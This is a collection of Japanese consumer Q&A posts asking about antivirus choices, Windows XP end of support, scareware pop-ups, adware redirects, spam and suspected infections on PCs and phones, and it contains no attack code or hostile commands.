久しぶりに、祖父の家に行ったところ、XPが使えなくなるらしいから、何とかしてくれと言われました。 そこで、とりあえず、PCを見てみたのですが、アップデートした形跡が一切ありませんでした。 セキュリティー環境としては、プロバイダから貰ったルータとアンチウイルスソフト（こちらの定義ファイルだけは更新されていました）でしたが、1週間に1回程度ホームページ（株価、証券会社、アマゾン、楽天を利用する程度）を見ているようですが、特に、ウイルスなどには感染していないようでした。 今までアップデートしておらず大丈夫であってのであれば、これからも大丈夫な気がしますが、具体的にどのような危険があるのでしょうか？ PCそのものは問題なく使えるとは説明しましたが、新しいOSにするか買い替えた方が良いという話模様聞きますし、実際のところどうなのでしょうか？
最近windows8搭載のパソコンを購入しました。最初からNortonというウイルス対策ソフトが60日間無料で入っていたのですが、新しくウイルス対策ソフトを入れたい場合どのような手順ですれば良いでしょうか？ (1)現在入っているNortonをアンインストール　 (2)新しい別のウイルス対策ソフトをダウンロード で宜しいのでしょうか？ (1)と(2)の間にインターネットに接続するのが何だか怖いのでダウンロード版ではなくCD版なら問題ないのかと思っています。 また、新しいソフトは、(株)マグノリアの「BACK　TO　XP　FOR８」を既に購入済みで、無料ウイルス対策ソフトを標準装備とありますのでこちらで良いかと思っていますが無料のソフトだと問題がありますでしょうか？もし無料ソフトでは不充分でしたらウイルスセキュリティゼロの購入を考えています。
こんばんは。都内在住の20代男性です。 スマホのmedius n-07dを使っていて、プロパイダはドコモでOsはアンドロイドです。 色々調べたのですがアンドロイドのanti-virusアプリに関してどうしてもわからないことがあるので質問させていただきます。 Dr.web lightやMcafeeやtrustgoなどのスマホのanti-virusアプリはシステム領域の脅威を検知しますか？ 駆除できないのはわかったのですが、、、 以下に以上のような疑問にいたった事のてん末を述べます。 無料のDr.web lightを常駐させて先日ネットサーフィンしていたところ、あるリンクをクリックした瞬間に 「あなたの携帯はウイルスに感染しています。以下の指示に従ってウイルスを除去してください」 という警告文らしきものがでました。ただ、その警告文の後に指示はありませんでした。この警告文がアンドロイドのシステム上のものなのか、webページ上の悪戯であるかの真偽は私にはわかりません。 怖くなった私はとりあえず、スマホを初期化してMcafeeのフルスキャンをかけましたが、脅威は見つかりませんでした。 また、Dr.webや感度の高いTrust goを入れてフルスキャンをかけてみましたが、同様に脅威は検出されませんでした。 この場合ウイルスにかかっていないといっていいのだろうかと思い上記のような疑問に至りました。 ウイルスによると思われる症状は一切出ていません。 以上です。お答えよろしくお願いします。
ウイルスの作成者側の人には ウイルス対策は必要か？ ウイルス自体 知識のある人が作っているとして 感染するとどうなるか？や 感染の仕方 方法など よく分かっていると思うので ウイルスに感染しにくい方法や 感染しても それに気づく能力があるから 実質 被害は出さない（感染しても外部に通信させない等） こんなことを考えてみて ウイルス作成者自身には 対策ソフトなんて 不要である。 という考え方は できると思いますか？ （生身のハッカーが そのＰＣを リアルタイムで入り込む等は 除外 で） 知識があれば 感染しない ということではなくて ウイルス対策なんて 必要ないと思う。 という疑問です。
いつも質問の際はお世話になっております。 AVGインターネットセキュリティ2014についてですが、最新版のAVGインターネットセキュリティ2014のスペック＝容量はどの位なのでしょうか？ サイト上で色々と検索をしてみましたが、見合った情報がなかなかみつからなかった為、アドバイスをいただけたら有難いと思います。
皆さんと同じくウインドウズＸＰのサポート終了後に新しい OSを入れる金が無いですが、ハッカーの攻撃は怖いです。 LinuxのOSは無料と聞いた事があったので、軽く調べたら 、プログラミングに詳しい天才な人達、ほとんどがボランテ ィアで日夜メンテナンスを続け、進化し続けているらしい。 http://lotech.way-nifty.com/lotech_inside/2013/0 … これで何とかなりそうでしょうか？それとも何か他に策が あれば教えてください。コンピューターに関しては素人で Linuxを今のＸＰの後にインストールしたら自分のファイル はどうなるのか？破損とか、そんな知識もありません。 それらも含めて、お忙しいところ恐縮ですがお願いいたし ます。
WiFiでノートパソコン使っています。それにはウィルスクリアが入っており 保護されていますが、同じ無線ルーターで使っているandroidのタブレットがあるのですが これにウイルス対策がなされているのかが解りません？ 確認する方法があるのでしょうか・・というより必要なのでしょうか? ご教示お願いします。
ウイルス対策ソフトは両立させては不可との事です。 今私はA社の対策ソフトを使用していますが、B社の に切り替えしたいと思っています。このような場合は どうしたら良いでしょうか。例えばアンインストール している間とインストールしている間の期間はネット 接続切り離し可能でしょうか。或いはOS自体の対策 にお任せして運を天に任せることしかないでしょうか。 よろしくお願いします。 　
所有しているPCがINTERPOLというウィルスに感染したようです。 WINDOWS7です。 セーフモードで起動しても、勝手に再起動され無理です。 http://detail.chiebukuro.yahoo.co.jp/qa/question … ↑でのベストアンサーの回答に書かれている、USB用のレスキューのプログラムも、 PC起動後にINTERPOL画面が邪魔をして反応しません。 「ファイル名を指定して実行」も、タスクマネージャも同じくINTERPOL画面で邪魔され 何も出来ない状態です。 同じような状況になった方はいらっしゃいませんか？
ubuntuがセキュリティに強いのは色々検索して分かりました。↓ http://unnnunnnet.blog47.fc2.com/blog-entry-64.h … http://linuxsalad.blogspot.jp/2009/02/ufw.html (1)ぶっちゃげどっちが不正アクセス、踏み台にされやすいですか？ windows7 セキュリティはベターなウィルスバスター 純正ファイヤーウォール使用、ファイヤーウォールチューナーも使用 internetexploer11 skaype等有名なソフトはインストール、しらないソフトはインストールしない ubuntu13.10バージョンで何も設定しない状態 firfox ※両者とも、普通の使い方、ソフトを使ったり、 　ネットサーフィン（怪しいサイトは見ない） 　sns使用 ニコニコ動画、youtube視聴という仮定です。 宜しくお願いします(*^^*)
OSとセキュリティソフトで多層防御が成立してるならXPの脆弱性攻撃で、OSが防御し損ねてもセキュリティソフトで防げるはず。でも実際は防げてない。 防げないのはPCセキュリティが多層防御というのが嘘で、防御を担当している部分が、OSとセキュリティソフトでそれぞれ別だからですか？ それとも、OSとセキュリティソフトで防護がかぶってる部分も本当にあるんでしょうか？ 具体的なところを教えてください。
　windows madia playerをインストールしていたらReg　clean　Proの無料スキャンが出てきて無料で出来るとの事でしたのでスキャンをしたら９８９のレジストリエラーが検出されましたと出ました。エラーの修復を勧めるような感じになっていますがこれは有料らしいのです。メディア　プレーヤーを使えるようにするには有料でこのエラーを修復しなけらばいけませんか？　無料でメディア　プレーヤーを使えるようにする方法はありませんか？
ウイルスの入ったSDカードや外付けハードディスクはパソコンにつないだ時、ファイルとして目で確認できますか？ つないだ瞬間につないだパソコンに入り込み元のSDカード等から消えてなくなるということはありますか？ 「隠しファイル、隠しフォルダー、および隠しドライブを表示する」の設定にしています。 よろしくお願いします。
フォルダかファイルを開けてデータ管理をしていたら、ポインタが５ｃｍほど瞬間移動する現象がたて続けに3回起こりました。 いずれもタッチパッドでポインタを移動させようと操作したときで、自分が動かしたい方向とは反対方向に瞬間移動しました。（このときはインターネットに接続されていないことを目で確認しました） それから別の時ですが、スリープ状態のときに勝手にパソコンが動き出しました。（このときはインターネットに接続されていたのか確認していません） 普段インターネットには、接続していません。（初期設定の時のみ一度つなげましたが、以降はスタンドアローンで使用しています。） ウイルスを仕込まれた可能性のある、SDカードや外付けハードディスクをつなげたことがあります。 インターネットにつないでいないので、ウイルス対策ソフトはいれていません。 パソコンが勝手に動いたログを確認しようとイベントビューアーを開き、見てみましたが見方が悪いのかその時間帯のものが見当たりませんでした。 見たのはカスタムビューの管理イベント、Windowsログの中のアプリケーション・セキュリティ・Setup・システム・Forwarded Events、アプリケーションとサービスの中のInternet Explorer等です。 Microsoft-IEの中のDiagnostic、Microsoft-IEDVTOOLの中のDiagnostic、Microsoft-IEFRAMEの中のDiagnosticは無効、サブスクリプションは0件でした。 自分で調べてみたところ自動実行スクリプトというものがあるらしく、まずはウィルス対策ソフトを入れようと考えています。 そこで質問なのですが、無線のインターネット環境がある状態の場合、勝手にネットに接続されてしまうウイルス？というのは存在しますか？ 存在するとすればワイヤレスネットワーク接続に現れますか？ 「接続されていません」となっていれば安心してよいものなのでしょうか？ パソコンが勝手に動き出したログはどこを見ればよいのでしょうか？ できればウィルス等が侵入しても勝手に無線接続をできないように設定したいので、ご教授お願いします。 使っているのは、Windows７Home Premiumです。 よろしくお願いします。
ウィルスバスターを使用してます。 最近、出会い系メールが毎日山ほど届きうんざりしています。 質問です。 ●ウィルスバスターのサービスで迷惑メール対策のソフト・・あるいはサービスはありますか？ ●大手の電気店で迷惑メール対策ソフトを販売している販売店を紹介してください。 よろしくお願いいたします。
今、カスペルスキーのアンチウィルス 2013 を入れています。　PCは家に３台あって、OS は Vista と Seven の両方です。　 期限切れになるし、もっと安全性を高めようと思って同社の 2014 マルチプラットフォーム セキュリティ というものをダウンロードしようと思ったのですが、口コミ （カカクドットコムなど） ではトラブル発生など意外に評判がよくなかったので迷っています。 軽くて、かなり安全で、しかもPCにトラブルを起こさないソフトのオススメがあれば、お願いしたいのですが　・・・ それと、アンチウィルスだけというのが安いのですが、これだけじゃ安全性に不安が残るでしょうか？　PCで銀行取引やクレジット・ショッピングしたりするので、情報が盗まれるのがとても不安です。
　去る11日に、「ウインドウズＸＰのサポートが切れた後はどうなるんでしょうか」、と言う質問をしました(No.8471413)。内容には二つの質問がありました。一つについては満足できる解答を沢山頂きましたが、まだ一つ残っています。以下の2点について改めて質問いたします。 (1)ウェッブサイト全体の問題だと思います。私もホームページを開設しており、現在も2日に1度のアクセスがあります。ウイルス付着のＸＰからのアクセスに対して、何か防御策が必要なんでしょうか。発信者のＯＳは分かりませんから、難しい問題だと思いますが心配です。 (2)4月からのＸＰは、いわば現役を定年退職した老体です。今後利用者は減少の一途でしょう。このようなＯＳにウイルスをばら撒く意味はなくなると思います。当初はとにかく、ＸＰの安全性は逆に高まっていくんじゃないかと思いますが、いかがでしょうか？　ご意見をお聞かせください。(KG)
　今年の4月9日からウインドウズＸＰのサポートが切れますが、それ以後はウイルスの危険がでるので、ＸＰを使うパソコンとはメールの交流を止めるという人がいます。私は、プロバイダーのウイルス駆除サービスと契約し、シマンテック社のウイルス防止ソフトを入れて自動更新しています。それでも危険となると、世界中のサイトは皆危険にさらされることになります。発信者が何のＯＳを使っているかは受け側は分かりませんから、防ぎようがないと思います。ＸＰはそんなに危険になるんでしょうか。私は3年前にパソコンを新品にしたばかりだし、ＯＳを入れ替えるのも単純にはいかないようなので、暫くは今のパソコンでＸＰを使い続けるつもりですが、これは良くないことなのでしょうか。新聞もテレビもこの問題について何も報道してくれません。この問題について詳しい方に是非ご意見をお伺いしたいと思います。(KG)
ネットサーフしていたら、以下の英文が出ました。xxxの部分は私のPCを特定する数字が入っているので、ここではxxxに変えてあります。 Hi, your IP address (xxx.xx.x.xxx) is considered by our system as a bot. We don't like to be a goal to be scanned by bots! Please enter the captcha code below and press <ENTER> if you are human. We will unblock your IP address if you are not bot ;-) Thanks! 　これは、私のPCは悪性のプログラムを出している。もし、私がロボット（悪性プログラム）でなく、人間なら下記コードを入力すれば、私のIPアドレスを解除してくれる（ネットサーフできるように？）という内容だと思います。ほかの部分のネットサーフは何ら問題なくできます。 どうしたらいいでしょう。 　よろしくお願いいたします。 　
Windows 7ですが、手動ウイルス検査をしたら、トロイの木馬に感染していました。 インストールしてある市販のウイルスセキュリティーで自動隔離するのですが、毎日、繰り返し同じ種類のウイルスが検出されます。 トロイの木馬の種類は、001e15121で、ブルーレイディスクプレーヤーのプログラムに感染しているとの表記も毎回同じです。 隔離しても繰り返し、毎日感染するというのは、どういう事なのでしょうか？？ 原因と対処法について教えてください！！
僕は現在コンピューター系の専門学校に通いながら、中小企業でアルバイトをしています。 本日、上司に呼ばれまして何事かと思ったところ、 会社のパソコンがウイルスに感染したのでみてほしいとの事でした。 既に三台のPCに伝染してしまっていました。 なお、会社のPCはアンチウイルスソフト等のセキュリティ対策をしていませんでした。 色々調べた所、トロイの木馬に感染しているようで、症状としてはUSBメモリ等を挿すと その中に勝手にショートカットが作成されます。 そのショートカットのプロパティを見ると、まさに下記のサイトに記述されているようなものでした。 http://mbasic.facebook.com/notes/norton/%E3%83%A … その後、フリーのアンチウイルスソフトを導入しスキャンしましたがウイルスは認識されず、 他にもレジストリやシステムファイルをいじるなど今の僕が出来ることを全てやりましたが、駄目でした。 なので、上司には感染拡大を防ぐ為にとにかくPCのネットやLANの接続を切り、 バックアップをとってからリカバリーCD等でOSの再インストールをするしかないと伝えました。 その後上司は社長と話し合っていましたが、結論としては 四月に新しいPCを導入する予定なので(これは今のPCがWindowsXPだからだと思います)、 それまでは今のPCをウイルスに感染している状態のまま、ネットには繋がずだましだまし使う、 というものでした。 再インストールをすると、大事なデータを誤って消してしまう可能性があるからだということです。 作成されるショートカットをクリックしなければ、なんとかなるのではと言われました。 ここで質問なのですが、はたしてその状態でPCを使い続けても大丈夫なものなのでしょうか？ なにかおもわぬ事態はおきませんか？　僕も勉強中のためよく分からないのです。 あと、もしかしてOSの再インストールをせずに直す方法があったりするのでしょうか？ ちなみに感染源ですが、はっきりしたことは不明ですが、 上司が自宅から持ち込んだUSBメモリーを会社のPCに挿したところ、感染したようです。 なにとぞご教授をお願いします。
最近クレジットカードが不正利用されてカード番号を変えてもらいました。しかし、あれ以来、いくつかのサイトから不正ログインされたとのメール連絡が来るようになりました。PCにウィルスがいるのかと思い無料のウィルスバスターでスキャンしたのですが何も見つかりませんでした。このままPCに新しいクレジットカード番号などを入力してもよいものか不安なのですが、みなさん、どう思いますか。
ウイルスバスタークラウドとノートン360ではどちらが効果的で 使いやすいでしょうか？ 教えてください。
インターネットエクスプローラで、ホームページなのでリンクをクリックすると新しくタブを開くように設定してあるのですが、自分の希望したサイトが一瞬開いた後、数秒後に、『Sup』という表示が出た後に、広告サイトに自動的に飛んでしまうので困っています。 対処方法を教えてください。 ❶自分の希望したリンクへ飛ぶ ❷数秒後下記のようなリンクが表示される http://pp.developunit.info/z/?eid=13&hid=0&pid=1 … ❸その後下記のようなサイトへ飛ばされます http://kqh17.wubiwunozih.com/hxqcneblj3 これ以外にもDMMのゲームサイト広告や、ウィルス対策ソフトの広告などがでてきます。 対策を教えてください。 毎回表示されるので困っています。
教えて頂きたいのです。 現在、マカフィを使っていますが、 ＰＣに『マカフィー アンチウイルス プラス』と『McAfee Security Scan Plus』 ２つインストールされています。 これは間違って、２つインストールしてしまったのでしょうか。 それとも、マカフィを動かすにはこの２つが必要なのでしょうか。 １つで良いならどちらかをアンインストールしたいと思います。 また、契約の解除などはどのようにしたら良いのでしょうか。 こちらＰＣに素人で全くわかりません。 現在、ＰＣの動きが悪いのもこのせいでは…と思っています。 どなたか、詳しいかた、よろしくお願い致します。
こんにちは！ ウイルス対策ソフトでウイルススキャンしたところ、下記のようなものが検出されました。 グーグルコームに関連したもののようですが、どういうものなのか、どんな影響がある ものなのか、わかりません。ご存知の方、いらっしゃいましたら教えてください。
マカフィー・リブセーフを使っています（購入したPCにプレインストールされていました） スケジュールスキャンが実行されません。 OS Windows8.1 設定した時間になってもスキャンが実行されず、セキュリティレポートを確認すると、次のスケジュールスキャンの時間が、絶えず現在時刻より後の時刻になってしまいます。 PCの電源を入れっぱなし（デスクトップです）で全く作業をしていない状況でも、スケジュールスキャンが実行されません。どうすればいいのでしょうか？手動でのスキャンはできます。手動でのスキャンの結果はウィルス無しです。 また、リアルタイムスキャンやファイアウォールを無効に設定してみても、すぐに有効に切り替わったり、設定画面では無効になってるのに、ホーム画面では有効になっていたり、定義ファイルの更新ボタンを押すと、一瞬画面が切り替わるだけで、更新もされません。無茶苦茶です。どうなっているのやら・・・。 再インストールしたら、有効・無効の表示と定義ファイルの更新は、見かけ上まともになりましたが、スケジュールスキャンはやはり実行されないままです。（試しに、マカフィーを一旦アンインストールして他社製のアンチウィルスソフトでスキャンしても、ウィルスは発見できませんでした。） Virtual Technicianも試しましたが、スケジュールスキャンが実行されるようにはなってくれません。 どうしたらよいのですか？ また、他にも同様の現象が出ている方はいますか？ よろしくお願いします。
ニュースにもなったpc乗っ取りなどは簡単にされるものなのですか？ 乗っ取りではなくても、他人が他人のpc画像なのどを見れたりは簡単にできるものなのですか？一般的なセキュリティーはどのくらいのものなのでしょうか？ すごく心配です。自分のpcには他人に見られたら自殺ものの画像があるので・・・対策方法などもあれば教えてください。 今はSDカードなどに移し保存や観賞時のみPCに接続しそれ意外の時は、SDを抜いています。これは効果的ですか？
久しぶりにネットに繋げたら、アップデートしてくださいという表示が出たので、クリックしました。12個アップデートしたようで、時間が20分ほどかかりました。 ですが、よく考えたら、今まで自動でアップデートしていたと思い出しました。 そして、クリックしたと書きましたが、クリックしたかどうか、本当はよく覚えていません。が、たぶんですが、したと思います。 もしかして、へんなものをDLしたかと、心配しています。 どう思いますか。
カテゴリ違いだったらすみません。 Google Chromeを使用しているのですが、カスペルスキーの最新版を無償バージョンアップしたところネット決済保護というのが拡張機能に第三者によってインストールされましたという表示とともにインストールされました。 しかし、有効にするか無効にするかという表示（ウィンドウ？）が新たに出たのですが、その表示の右上の×をクリックすると先程まであったネット決済保護の表示がなくなっていました。（ネット決済保護はタスクバーやデスクトップから使えます） カスペルスキーをインストールしなおしてもだめでした。再び、拡張機能に戻すことはできるでしょうか？ よろしくお願いします。
ウィルス対策ソフトから、マシン起動時に毎回以下のようなポップアップが表示されます。 「ウィルスバスターCorpで検出された挙動監視ポリシー違反およびブロックされた プロセスは次のとおりです」 そしてそこに以下のようなのが書かれてます。 ・csrss.exe ・ZwCreateThread ・ZwWriteVirtualMemory ウィルス対策ソフトで全チャックをしても、ウィルスは発見されません。となります。 このポップアップはどのような物でしょうか？また表示しないようにできるでしょうか？
パソコンや外付けＨＤに保存しているデジカメ写真のデータを劣化させたり悪影響を及ぼすウイルスなどはあるのですか？ また、診断する方法などがれば教えてください。
XPにウィルスセキュリティゼロを入れようと思っていたのですが・・・、 メーカーサイトに、 「Windows XPは、2014年4月9日に提供元であるマイクロソフト社のサポート期間が終了し、 セキュリティ修正プログラムが提供されなくなります」 との説明があります。 更に 「サポート終了後のご使用は危険です」 「新しいOSのパソコンに買い替える事をお勧めします」 とも説明されています。 当方、仕事で使用するソフトがXPのみでしか使えない物で、パソコンの買い替えは当面考えられません。 これまでは無料ソフト「avast」を使用していたのですが、avastアップデート後、仕事のソフトとの相性が悪くなり、肝心の仕事ソフトが動かなくなりました。 で、ウィルスソフトの載せ替えを検討しているのですが、冒頭の「XPサポートの問題」が浮上してきました。 ウィルスセキュリティゼロ以外でも一向に構わないのですが、他のソフトでも「XPサポート問題」は存在するのでしょうか？ デジタル音痴故、何を入れるべきか頭を悩ませております。 「コレ」と言うソフトがあるならご案内いただきたいと思い質問させていただきました。
基本ソフトは ７　です。セキュリティソフトはノートンです。 ダウンロードしたファイルのウイルススキャンの仕方が分からなくて困っています。 どなたか教えていただけると助かります。お願いいたします。
ログ採取ツールというアイコンがスタートボタンをクリックする突然現れました。 これはどういったものでしょうか？　もしかしたらウイルスとかじゃないでしょうか？ よろしくお願いいたします。
数ヶ月ぶり迷惑メールホルダー見ると　表題「二谷誠　永遠の夏休みー」がずらり　怖くて未開封のままですが 　定年退職者をからかっているように思え　怖くて未開封のまま消去していますが　石井匠の同様メールが終わり　代わって　後継のように　来ています（今度は１日数回来ることはありませんが） 単なる安全なメルマガでしょうか 「永遠の夏休み」検索すると　ツタヤ　にDVDありますが関係無いようです
Windows8のPCを買ったときに付録でついてきたノートンインターネットセキュリティを入れようとしたら 互換性に問題があってエラーでインストールできないとなって非常に困っています。 いれるまでにはじめから体験版の90日ウィルスバスターがあったので、その間に8.1にOSを変更したせいなのでしょうか。 いろいろ試して他のセキュリティソフトのアンインストールもしたのですが、互換性の問題がクリアできず、インストールが途中で止まってしまい。困っております。8.1でも8用のNortonインターネットセキュリティが入れられるようどうか助けてください。 互換性がなく通常モードでというのもよくわかりません。一応試してみましたが。そもそもがダウンロード画面にプロパティがないのでできません。パソコンに不慣れで困っております。8.1の画面で互換性の問題をクリアできるように分かりやすく説明していただけるとありがたいです。
富士通のＦＭＶ（ＯＳはウインドウズ7）にノートンのインターネットセキュリティーを入れて使用しています。 先日ブラウザーをＩＥ11にバージョンアップしたところ、ＰＣにマカフィーのセキュリティースキャンプラスなるものがインストールされました。 以前に、「ＰＣに2種類以上のセキュリティーソフトを入れないほうがいい…」という話を聞いた事があるので、マカフィーの方をアンインストールしようと思うのですが、何か問題あるでしょうか？
失礼します。 動画音楽再生にPC購入後からGOMプレイヤーを使ってます。 アップデートでウイルス感染の可能性あるとのことですが いくつかのことが分からず、調べたんですが、もともとPCに詳しくないためなんのことかよくわからず、 実際に知っている人からアドバイス受けないと安心できないので質問します。 まず、アップデートで感染の可能性があるとのことですが、 GOM再生時に最新のアップデートに更新しますか？　はい　いいえの窓が現れるんですが、 これはもう2012あたりから面倒で更新したことがないんですが、このウインドウが出るだけでも感染の可能性はあるんでしょうか？ 次に、自分は有料のウイルスバスターを入れているんですがPC全体スキャンしてみましたが何も見つかりませんでした。 GOMのサイトやニュースサイトで確認方法が紹介されてましたが、これがよくわかりません。 まず自分のPCの中にGOMのフォルダがあるのはCドライブ→プログラムと、ドキュメントに自分で作った新しいフォルダの中だけのはずなんですが どこを見てもGrLauncher.iniがどこにあるのかわからず、 またフォルダの更新日時自体も2012年あたりでした。 あと、もしウイルス感染したとして、パソコンの中の動画　壁紙画像　音楽もダメになっちゃうんでしょうか？ そういった趣味のデータのみ外付けHDDなりに移して、新品PCにコピーしたら、その新品のPCも感染しちゃうんでしょうか・・・？
失礼致します。 パソコンをウイルスセキュリティ０にてスキャンしたらoutlook2007のメールからトロイの木馬が検出されました。 仕事で使っていたパソコンなので情報が流出していないかが心配です。 Trojan ( 7000000c1 )というウイルスの名称なのですが、調べてもどのような悪さをするのか分かりませんでした。（使っている感じでは操作性が悪くなったとかはありません。） 質問は以下の通りです。 １：私のパソコンは既に感染して情報が流出してしまったのか？それともあるだけで感染を未然に防いでいるのか？ ２：感染している場合このウイルスはどのような悪さをするのか？ 3:「隔離した」となっているが隔離で平気なのか？ セキュリティについての知識がありません。 どなたかお手数ではございますが、ご教授お願致します。 ;================ ウイルス検査結果　-　ここから ================== 25-01-2014 11:04G:\$RECYCLE.BIN\S-1-5-21-3057978279-2708985655-4085687291-1000\$RRFGJ6N\受信\New Fax Message on 11 26 2013 (137).msgis a Trojan ( 7000000c1 )隔離しました 25-01-2014 11:04G:\$RECYCLE.BIN\S-1-5-21-3057978279-2708985655-4085687291-1000\$RRFGJ6N\受信\New Fax Message on 11 26 2013 (157).msgis a Trojan ( 7000000c1 )隔離しました 25-01-2014 11:04G:\$RECYCLE.BIN\S-1-5-21-3057978279-2708985655-4085687291-1000\$RRFGJ6N\受信\New Fax Message on 11 26 2013.msgis a Trojan ( 7000000c1 )隔離しました 25-01-2014 11:04G:\$RECYCLE.BIN\S-1-5-21-3057978279-2708985655-4085687291-1000\$RRFGJ6N\受信\New Fax Message on 11 29 2013.msgis a Trojan ( 7000000c1 )隔離しました 25-01-2014 11:04G:\$RECYCLE.BIN\S-1-5-21-3057978279-2708985655-4085687291-1000\$RRFGJ6N\受信\New Fax Message on 12 03 2013 (82).msgis a Trojan ( 7000000c1 )隔離しました 25-01-2014 11:04G:\$RECYCLE.BIN\S-1-5-21-3057978279-2708985655-4085687291-1000\$RRFGJ6N\受信\New Fax Message on 12 03 2013.msgis a Trojan ( 7000000c1 )隔離しました 25-01-2014 11:04G:\$RECYCLE.BIN\S-1-5-21-3057978279-2708985655-4085687291-1000\$RRFGJ6N\受信\New Fax Message on 12 04 2013 (75).msgis a Trojan ( 7000000c1 )隔離しました 25-01-2014 11:04G:\$RECYCLE.BIN\S-1-5-21-3057978279-2708985655-4085687291-1000\$RRFGJ6N\受信\New Fax Message on 12 04 2013.msgis a Trojan ( 7000000c1 )隔離しました ;================ ウイルス検査結果　-　ここまで ================== パソコンスペック lenoboG580 メモリ8G ６４ビット corei5-3210M 2.50Ghz
大変困っております。 ウイルスソフト「カスペルスキー　３０日間　お試し版」をインストールした直後から、メール添付ファイルが一切開けません。（本文の送受信は問題ありません） カスペルスキーに問い合わせし対処しましたが、改善が見られずアンインストールしました。 しかし現象は変わらず、インストールした時点で、ＰＣの他のソフトとの相性不具合によるとの回答でしたが、対応策は不明。 メール→ツール→オプション（セキュリティ）から「ウィルスの可能性がある添付書類を開いたり、保存したりしない」のチェックを外しても変化はありません。 添付書類をクリックしても、エラーメッセージが出るわけでもなく、無反応。名前をつけて保存を指定すると「コマンドを実行出来ませんでした」　と表記されます。 ・Ｗｉｎｄｏｗｓ　ＸＰ、　Ｍｉｃｒｏｓｏｆｔ　Ｏｕｔｌｏｏｋ　Ｅｘｐｒｅｓｓ６使用　　です。 どのたか教えて頂ければ助かります。よろしくお願い致します。 　
こんにちは スマホのウィルス対策をおしえてください 動画見たりしていますので、 また、迷惑メールもよく送られてくるので心配になってきました もちろん拒否設定にすぐにしますが 以前の古いスマホですと auで聞いたところ 月300円くらい！?で、ブックマークしたものだけウィルスチェックできるものがある と聞きました これ以外はないとのことでした つい最近、新機種にかえたので ウィルス対策したいと思っています 皆様、スマホのウィルス対策はどうされていますか？ 知人はiphoneですが、全く何もしてないとのことでした ※スマホ、パソコン等に詳しくありませんので 優しく説明していただけたら助かります(^^;
Googlechromeの動作がおかしくなりavastのスキャンをしましたらウイルスが発見され、チェストに移動という処理をしましたが、その後ブートタイムスキャンを勧められたので、すぐに再起動してブートタイムスキャンを行いました。 そこでもウイルスが発見され処理を行おうとしましたが、キーボードをいくら押しても反応しません。 （その場はやむをえず、電源長押しでの強制終了しました。） その後、ネットで検索しいろいろ調べてみるとブートタイムはUSBキーボードだと反応しない？らしく、ps/２接続のキーボードを使った方が良いようなのですが、私のパソコン（富士通のESPRIMO　FH55）　にはps/2接続の口がないのです。 そこで、今度はキーボード操作をしなくて済むよう、ブートタイムスキャン時にウイルスを発見した場合は自動的にチェストに移動するという設定をavastでしました。 お聞きしたいのは、この設定でブートタイムスキャンをした場合最後までキーボード操作することなくスキャンが終了するものなのでしょうか、ということです。 何度も強制終了するのも不安ですので…。 どなたか、詳しい方教えていただけると助かります。 ちなみにOSはwindows7です。
失礼します 自分の使っているパソコンなんですがノートンを導入していて、登録アドレス先がgooメールです。 この度無料版が廃止するとのことですが、廃止された場合ノートンを導入している自分のパソコンにどのような不都合なことがおきますでしょうか？ ノートンの期限が今年の10月まであるんですが、アンインストールして再度goo以外のアドレスでインストールの登録はできますか？ 今後有料のgooメールする予定はないもので いろいろ見てもやりかたがわからず不安で困っています・・・
こんにちは、会社で、セキュリティの話題があがり、その時自宅のＰＣにも同僚や上司から、パソコンにはウイルス対策ソフトはいれておいて損はないと言われました。今ならAVGの無料ウイルスソフトがいいのではと勧められましたが、しかし、私はあまりパソコンに詳しくなく、、そのAVGウイルスについて、初心者にもわかりやすい、やり方の参考になるサイトを教えてほしいのです。よろしくお願いします、
RegCleanProとAdvanced SystemProtectorというソフトがインストールされてしまいました。有害らしいのでコントロールパネルからアンインストールしようとするのですが、しようとすると現在のプログラムのアンインストールまたは変更が完了するまでお待ちくださいといったメッセージが流れるばかりでアンインストールできません。他に作業している様子はなく、この２つのソフトだけ何度やっても削除できなくて困っています。アンインストールする方法はほかにありませんか？
（下に掲載した画像はスクリーンショットです） 以前、アメブロ閲覧中に下の広告画像が表示されたところESETが反応した、という旨の質問をさせていただきました。 この件について運営に問い合わせたのですが、まだ返事は帰って来ていません。また、該当画像の別バージョン（デザイン性は同じ、画像の色と文字が違う）が表示されたときもESETがブロックしました。 それからしばらくは問題なくネットを使っていたのですが、今度はAll About閲覧中に該当画像が表示されたところ、やはりESETがブロックしました。 アメブロ、All Aboutとも健全なサイトなので悪意ある広告画像を掲載することはないと思いますが、少し不安になってきました。 当方、ESETを導入する以外、セキュリティ的に特別なことはしていません。 これはESETの誤認なのでしょうか？ それとも、他のセキュリティソフトを使用している方も反応しているのでしょうか？ 詳しい方、お教え願いますm(_ _)m
「警告　お使いのＰＣがクラッシュ寸前です　無料修理」 「パソコンの起動が早くなります」 とか、他にも何種類かが、出ます。 紛らわしい表現で迷惑して、困っています。 出なくすることができるでしょうか
iPodtouchにウイルスが入って、iPodtouchに入っている画像動画を取られることはありますか？ 前に、友達とアダルトサイトを見たり同人誌のzipをダウンロードしたりしてます。(zipダウンロードはそれをダウンロードするパスワードがありました。) 他人に見られたら終わりな画像動画です。 回答お願いします。
迷惑メール対策について 　頻繁に来ています。 　ビッグローブに電話したのですが会員でないので断られました。
わたしはヤフオクで3DS用のカセットを買いました。 以前、3DSについて質問させていただいたときは、ちゃんとしたものじゃないと起動？しないから大丈夫といわれました。 しかし、もし、買ったカセットにウイルスが入っていてカセットを使うときに一緒に起動して3DS内の大切な写真などを抜き取られるなんてことはあるのでしょうか？ とても心配です。 文がおかしいかもしれませんが、回答お願いいたします。
　ウイルスセキュリティZEROを利用しているのですが、通信販売で取り寄せたゲームをインストールしようとしたら、password stealerというウイルスが検出されたためインストールを中止しPCからCDを取り出しました。隔離ファイル一覧を見たら、処理の内容に「削除前にバックアップされました」とあり、現在の状態が空白になっていました。そのあとPC全体の検査をしたのですがウイルスは検出されませんでした。 　この場合、リカバリー等はしたほうがいいのでしょうか。 　また、このウイルスはパスワードを盗むと聞いたのですが、変える場合、家中のすべてのパソコンで、登録したパスワードを変えないと行けないのでしょうか。 　最後に、この商品は返品し、新しいものを取り寄せようと思うのですが、いきなりパソコンに入れるのは危ないのではないかと思うのですが、ウイルスが入っているか確認する方法はないでしょうか。 質問が多くなってしまいましたが、どうかご回答よろしくお願いいたします。
こんにちは。はじめて投稿します。とても困っています。 ドコモでARROWS　NX　F-06を使っています。 インターネットをしていたらいきなり画像のようなものが表示されました。 その後あわてて画面を消してしまったのですが 私のスマホはウイルスに感染してしまったのでしょうか？ ちなみにあんしんネットセキュリティで検索してもウイルスのようなものはみつかりません。 この画面が出た後どうしたらいいのかわからないのでスマホの電源を切っています。 詳しい方、どうか教えてください。よろしくお願いします。
